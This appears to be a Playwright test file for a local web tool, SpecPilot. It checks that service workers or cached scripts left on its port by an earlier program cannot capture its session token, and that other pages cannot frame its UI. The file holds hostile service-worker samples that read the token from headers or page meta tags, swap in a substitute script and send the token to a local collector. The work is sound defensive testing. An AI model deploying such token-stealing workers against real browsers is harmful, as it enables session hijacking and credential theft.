// An earlier program's browser state on the serve origin (BL-142, REQ-002.H.61, SEC-002.14 (c), TESTS-002.4): a
// service worker or a long-cached script left on the port takes no token. Each test first runs an "occupant" on the
// port SpecPilot then serves on, in the same browser context; a collector on another port records what leaks.
// Not browserTest(): its request fence (page.route) turns the HTTP cache off, which the cached-script case needs.
import { Browser, BrowserContext, Page } from 'playwright-core';
import { createServer, IncomingMessage, Server, ServerResponse } from 'http';
import { AddressInfo } from 'net';
import { Env, launch, makeEnv, noSideScroll, server, until, VERSION, waitView } from './harness';

let browser: Browser;
let env: Env;
let collector: Server;
let leaks: string[];
let collect: string;
const open: (() => Promise<void>)[] = [];
beforeAll(async () => {
  browser = await launch();
  collector = createServer((req, res) => {
    leaks.push(req.url ?? '');
    res.end();
  });
  await new Promise<void>(r => collector.listen(0, '127.0.0.1', r));
  collect = `http://127.0.0.1:${(collector.address() as AddressInfo).port}`;
});
afterAll(async () => {
  await new Promise(r => collector.close(r));
  await browser.close();
});
beforeEach(() => {
  env = makeEnv();
  leaks = [];
});
afterEach(async () => {
  for (const close of open.splice(0)) await close(); // the context first, as the harness does: its streams end with it
  env.cleanup();
});

const listen = (handler: (req: IncomingMessage, res: ServerResponse) => void, port = 0) =>
  new Promise<Server>((resolve, reject) => {
    const s = createServer(handler);
    s.once('error', reject);
    s.listen(port, '127.0.0.1', () => resolve(s));
  });
const shut = (s: Server) => new Promise<void>(r => {
  s.closeAllConnections();
  s.close(() => r());
});

/** Forwards `/loot...` to the collector; `extra` is the worker's own fetch handling. */
const worker = (extra: string, activate = '') => `
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(Promise.resolve(${activate || 'null'}).then(() => clients.claim())));
const COLLECT = ${JSON.stringify('')};
const loot = s => fetch(self.COLLECT + '/loot?' + encodeURIComponent(s), { mode: 'no-cors' }).catch(() => {});
const tokenIn = r => r.clone().text().then(t => { const m = t.match(/specpilot-token" content="([0-9a-f]+)/); if (m) loot('page:' + m[1]); });
self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/loot')) return e.respondWith(loot(u.search).then(() => new Response('')));
  const t = e.request.headers.get('X-SpecPilot-Token');
  if (t && t !== 'null') loot('header:' + t);
  ${extra}
});`;
/** Passes every navigation through and reads the page it gets. */
const PASS_THROUGH = worker("if (e.request.mode === 'navigate') e.respondWith(fetch(e.request).then(r => { tokenIn(r); return r; }));");
/** Navigation preload: the page arrives as the preload response. */
const PRELOAD = worker(
  "if (e.request.mode === 'navigate') e.respondWith(Promise.resolve(e.preloadResponse).then(p => p || fetch(e.request)).then(r => { tokenIn(r); return r; }));",
  'self.registration.navigationPreload.enable()',
);
/** Leaves navigations alone and substitutes the page's script, which reads the token's meta. */
const SUBSTITUTE = worker(
  "if (new URL(e.request.url).pathname === '/assets/app.js') e.respondWith(new Response(\"window.EVIL = 1; const m = document.querySelector('meta[name=specpilot-token]'); fetch('/loot?meta:' + (m ? m.content : 'none'));\", { headers: { 'Content-Type': 'text/javascript' } }));",
);
/** Leaves navigations alone and passes every other request through, seeing its headers. */
const OBSERVER = worker("if (e.request.mode !== 'navigate') e.respondWith(fetch(e.request));");

interface Occupied {
  ctx: BrowserContext;
  page: Page;
  port: number;
  loads: () => number;
}

/** A context whose origin `port` was used by an earlier program: its worker installed and in control, or a long-cached script. */
async function occupy(o: { sw?: string; cachedScript?: boolean; width?: number; port?: number; ctx?: BrowserContext; page?: Page }): Promise<Occupied> {
  const sw = o.sw?.replace('const COLLECT = "";', `self.COLLECT = ${JSON.stringify(collect)};`);
  const occupant = await listen((req, res) => {
    if (req.url === '/sw.js' && sw) return res.writeHead(200, { 'Content-Type': 'text/javascript' }).end(sw);
    if (req.url === '/assets/app.js') return res.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'max-age=31536000' }).end('window.EVIL = 1;');
    res.writeHead(200, { 'Content-Type': 'text/html' }).end(
      `<!doctype html><title>occupant</title>${o.cachedScript ? '<script src="/assets/app.js"></script>' : ''}` +
        (sw ? '<script>navigator.serviceWorker.register("/sw.js").then(() => navigator.serviceWorker.ready).then(() => { document.title = "ready"; });</script>' : '<script>document.title = "ready";</script>'),
    );
  }, o.port);
  const port = (occupant.address() as AddressInfo).port;
  const ctx = o.ctx ?? (await browser.newContext({ viewport: { width: o.width ?? 1280, height: 900 } }));
  if (!o.ctx) open.push(() => ctx.close());
  const page = o.page ?? (await ctx.newPage());
  page.setDefaultTimeout(10000);
  let loads = 0;
  if (!o.page) page.on('load', () => loads++);
  await page.goto(`http://127.0.0.1:${port}/`);
  await page.waitForFunction(() => document.title === 'ready');
  if (sw) {
    await page.reload();
    await page.waitForFunction(() => !!navigator.serviceWorker.controller);
  }
  await shut(occupant);
  loads = 0;
  return { ctx, page, port, loads: () => loads };
}

/** SpecPilot on the occupied port: the fixture project, or none. */
async function serveOn(port: number, roots = [env.project]) {
  const handle = await server.startSpecServer(roots, port, VERSION, { pollMs: 250, registry: env.registryFile });
  open.push(() => handle.close());
  return handle;
}

const registrations = (page: Page) => page.evaluate(() => navigator.serviceWorker.getRegistrations().then(r => r.length));
const controlled = (page: Page) => page.evaluate(() => !!navigator.serviceWorker.controller);
const hasToken = (page: Page) => page.evaluate(() => !document.querySelector<HTMLElement>('#quitBtn')!.hidden);
const loaded = (page: Page) => page.waitForFunction(() => document.querySelector('#projList .tile') !== null || document.querySelector('#footVer')!.textContent !== '');
const noLeak = () => expect(leaks.filter(l => /[0-9a-f]{64}|meta%3A[0-9a-f]/.test(l))).toEqual([]);

describe('a leftover worker or cache on the origin takes no token (BL-142)', () => {
  for (const width of [1280, 420]) {
    test(`a pass-through worker: the page comes without its token, the worker is removed, a reload is normal (${width} px)`, async () => {
      const o = await occupy({ sw: PASS_THROUGH, width });
      await serveOn(o.port);
      await o.page.goto(`http://127.0.0.1:${o.port}/`);
      await loaded(o.page);
      await until(async () => (await registrations(o.page)) === 0, 'the worker removed');
      expect(await hasToken(o.page)).toBe(false);
      expect(o.loads()).toBe(1); // served no token: no reload of its own
      if (width === 420) expect(await noSideScroll(o.page)).toBe(true);
      await o.page.reload();
      await loaded(o.page);
      expect(await controlled(o.page)).toBe(false);
      expect(await hasToken(o.page)).toBe(true);
      if (width === 420) expect(await noSideScroll(o.page)).toBe(true);
      noLeak();
    });
  }

  test('a navigation-preload worker: no token reaches it and it is removed', async () => {
    const o = await occupy({ sw: PRELOAD });
    await serveOn(o.port);
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await loaded(o.page);
    await until(async () => (await registrations(o.page)) === 0, 'the worker removed');
    expect(await hasToken(o.page)).toBe(false);
    noLeak();
  });

  test('a worker substituting the page script: the substitute does not run and the worker is removed', async () => {
    const o = await occupy({ sw: SUBSTITUTE });
    await serveOn(o.port);
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await until(async () => (await registrations(o.page)) === 0, 'the worker removed');
    expect(await o.page.evaluate(() => (window as unknown as { EVIL?: number }).EVIL)).toBeUndefined();
    await o.page.reload();
    await loaded(o.page);
    expect(await hasToken(o.page)).toBe(true);
    noLeak();
  });

  for (const width of [1280, 420]) {
    test(`a worker that sees the page's requests: no request carries the token, one reload, then normal (${width} px)`, async () => {
      const o = await occupy({ sw: OBSERVER, width });
      await serveOn(o.port);
      await o.page.goto(`http://127.0.0.1:${o.port}/`);
      await until(() => o.loads() >= 2, 'the one reload');
      await loaded(o.page);
      expect(await controlled(o.page)).toBe(false);
      expect(await hasToken(o.page)).toBe(true);
      expect(await registrations(o.page)).toBe(0);
      if (width === 420) expect(await noSideScroll(o.page)).toBe(true);
      await new Promise(r => setTimeout(r, 500));
      expect(o.loads()).toBe(2);
      noLeak();
    });
  }

  test('still controlled with the reload flag already set: no second reload, the page as --read-only shows it (420 px)', async () => {
    const o = await occupy({ sw: OBSERVER, width: 420 });
    // sessionStorage belongs to the tab and the origin, the occupant's too
    await o.page.evaluate(() => sessionStorage.setItem('sp-sw-reload', '1'));
    await serveOn(o.port);
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await loaded(o.page);
    await until(async () => (await registrations(o.page)) === 0, 'the worker removed');
    expect(await controlled(o.page)).toBe(true);
    expect(await hasToken(o.page)).toBe(false);
    expect(await noSideScroll(o.page)).toBe(true);
    await new Promise(r => setTimeout(r, 500));
    expect(o.loads()).toBe(1);
    noLeak();
  });

  test('sessionStorage throwing while controlled: no reload, no token used, the worker removed', async () => {
    const o = await occupy({ sw: OBSERVER });
    await o.ctx.addInitScript(() => Object.defineProperty(window, 'sessionStorage', { get: () => { throw new Error('blocked'); } }));
    await serveOn(o.port);
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await loaded(o.page);
    await until(async () => (await registrations(o.page)) === 0, 'the worker removed');
    expect(await hasToken(o.page)).toBe(false);
    await new Promise(r => setTimeout(r, 500));
    expect(o.loads()).toBe(1);
    noLeak();
  });

  test('an uncontrolled load clears the reload flag, so a later controlled load reloads once again', async () => {
    const first = await occupy({ sw: OBSERVER });
    await first.page.evaluate(() => sessionStorage.setItem('sp-sw-reload', '1'));
    const spec = await serveOn(first.port);
    await first.page.goto(`http://127.0.0.1:${first.port}/`); // controlled, flag set: stays
    await loaded(first.page);
    await until(async () => (await registrations(first.page)) === 0, 'the worker removed');
    await first.page.reload(); // uncontrolled: clears the flag
    await loaded(first.page);
    expect(await first.page.evaluate(() => sessionStorage.getItem('sp-sw-reload'))).toBeNull();
    await spec.close();
    open.splice(open.length - 1, 1);
    const again = await occupy({ sw: OBSERVER, port: first.port, ctx: first.ctx, page: first.page });
    let loads = 0;
    again.page.on('load', () => loads++);
    await serveOn(again.port);
    await again.page.goto(`http://127.0.0.1:${again.port}/`);
    await until(() => loads >= 2, 'the one reload');
    await loaded(again.page);
    expect(await hasToken(again.page)).toBe(true);
    noLeak();
  });

  test('a script cached for a year by an earlier server is not used', async () => {
    const o = await occupy({ cachedScript: true });
    await serveOn(o.port);
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await loaded(o.page);
    expect(await o.page.evaluate(() => (window as unknown as { EVIL?: number }).EVIL)).toBeUndefined();
    expect(await hasToken(o.page)).toBe(true);
  });

  test('zero projects, token-less: Home, and New project and #new stay on Home with no POST', async () => {
    const o = await occupy({ sw: PASS_THROUGH });
    await serveOn(o.port, []);
    const posts: string[] = [];
    o.page.on('request', r => {
      if (r.method() === 'POST') posts.push(r.url());
    });
    await o.page.goto(`http://127.0.0.1:${o.port}/`);
    await waitView(o.page, 'v-home');
    expect(await hasToken(o.page)).toBe(false);
    await o.page.locator('#homeNew').click();
    await o.page.evaluate(() => (location.hash = '#new'));
    await new Promise(r => setTimeout(r, 300));
    await waitView(o.page, 'v-home');
    expect(posts).toEqual([]);
    noLeak();
  });
});

// BL-143 (REQ-002.H.62, SEC-002.15 (a)): a page elsewhere frames the board; the frame does not draw it and the theme survives.
describe('no other page can frame the UI or wipe its storage (BL-143)', () => {
  for (const parentHost of ['127.0.0.1', 'localhost']) {
    test(`a page on ${parentHost}:<other port> frames the board`, async () => {
      const spec = await serveOn(0);
      const port = (spec.server.address() as AddressInfo).port;
      const parent = await listen((_req, res) => res.writeHead(200, { 'Content-Type': 'text/html' }).end(`<!doctype html><iframe src="http://127.0.0.1:${port}/#board"></iframe>`));
      open.push(() => shut(parent));
      const ctx = await browser.newContext();
      open.unshift(() => ctx.close());
      const own = await ctx.newPage();
      await own.goto(`http://127.0.0.1:${port}/`);
      await loaded(own);
      await own.evaluate(() => localStorage.setItem('sp-theme', 'light'));
      const framing = await ctx.newPage();
      const requested = framing.waitForRequest(r => r.url().startsWith(`http://127.0.0.1:${port}/`));
      await framing.goto(`http://${parentHost}:${(parent.address() as AddressInfo).port}/`);
      await requested;
      await new Promise(r => setTimeout(r, 1000));
      expect(framing.frames().length).toBeGreaterThan(1);
      for (const f of framing.frames().slice(1)) {
        const drawn = await f.evaluate(() => !!document.querySelector('#projList')).catch(() => false);
        expect(drawn).toBe(false);
      }
      await own.reload();
      await loaded(own);
      expect(await own.evaluate(() => localStorage.getItem('sp-theme'))).toBe('light');
    });
  }
});
